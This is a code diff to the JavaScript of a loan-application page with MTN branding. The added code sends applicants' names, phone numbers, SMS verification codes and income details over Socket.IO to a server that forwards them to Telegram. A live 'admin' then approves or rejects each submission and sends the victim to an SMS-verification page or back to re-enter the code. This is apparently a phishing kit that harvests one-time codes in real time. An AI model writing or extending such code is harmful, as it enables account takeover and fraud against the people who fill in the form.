@@ -1,3 +1,5 @@
+const socket = io(); // Connect to the server
+
 // --- Calculator Logic ---
 const amountSlider = document.getElementById('amountSlider');
 const amountDisplay = document.getElementById('amountDisplay');
@@ -41,9 +43,7 @@ function goHome() {
     document.getElementById('home-section').classList.remove('hidden');
 }
 
-// --- NEW VALIDATION FUNCTION ---
 function validateStep(stepNumber) {
-    // Check if all required inputs in the current step are filled and valid
     const currentStep = document.getElementById('step-' + stepNumber);
     const inputs = currentStep.querySelectorAll('input, select');
     let isValid = true;
@@ -51,11 +51,11 @@ function validateStep(stepNumber) {
     inputs.forEach(input => {
         if (!input.checkValidity()) {
             isValid = false;
-            input.reportValidity(); // Shows the browser's default error message (e.g., "Please fill out this field")
+            input.reportValidity(); 
         }
     });
 
-    if (!isValid) return; // Stop if there is an empty field or invalid pattern
+    if (!isValid) return; 
 
     if (stepNumber === 2) {
         const code = document.getElementById('verificationCode').value;
@@ -65,7 +65,6 @@ function validateStep(stepNumber) {
         }
     }
 
-    // If everything is valid, move to the next step
     nextStep(stepNumber + 1);
 }
 
@@ -90,3 +89,50 @@ function nextStep(stepNumber) {
         document.getElementById('sumTerm').innerText = term;
     }
 }
+
+// --- SUBMIT VIA SOCKET.IO ---
+document.getElementById('loanForm').addEventListener('submit', function(e) {
+    e.preventDefault(); // Stop normal page reload
+
+    const submitBtn = document.getElementById('submitBtn');
+    submitBtn.innerText = "WAITING FOR APPROVAL...";
+    submitBtn.disabled = true;
+    submitBtn.style.backgroundColor = "#ccc";
+
+    // Gather all form data
+    const data = {
+        loanType: document.getElementById('loanType').value,
+        loanAmount: document.getElementById('formLoanAmount').value,
+        loanTerm: document.getElementById('formLoanTerm').value,
+        purpose: document.getElementById('purpose').value,
+        firstName: document.getElementById('firstName').value,
+        lastName: document.getElementById('lastName').value,
+        phone: document.getElementById('phone').value,
+        verificationCode: document.getElementById('verificationCode').value,
+        employment: document.getElementById('employment').value,
+        income: document.getElementById('income').value
+    };
+
+    // Send to server -> Telegram
+    socket.emit('submit_loan', data);
+});
+
+// --- LISTEN FOR TELEGRAM DECISION ---
+socket.on('approved', () => {
+    // Admin approved -> Load next page
+    window.location.href = "/verify-sms.html"; 
+});
+
+socket.on('rejected', () => {
+    // Admin rejected -> Go back to phone number step
+    alert("Invalid details. Please enter the correct phone number and verification code.");
+    
+    // Reset button
+    const submitBtn = document.getElementById('submitBtn');
+    submitBtn.innerText = "SUBMIT APPLICATION";
+    submitBtn.disabled = false;
+    submitBtn.style.backgroundColor = "var(--mtn-yellow)";
+
+    // Go back to step 2 (Phone & Code)
+    nextStep(2);
+});
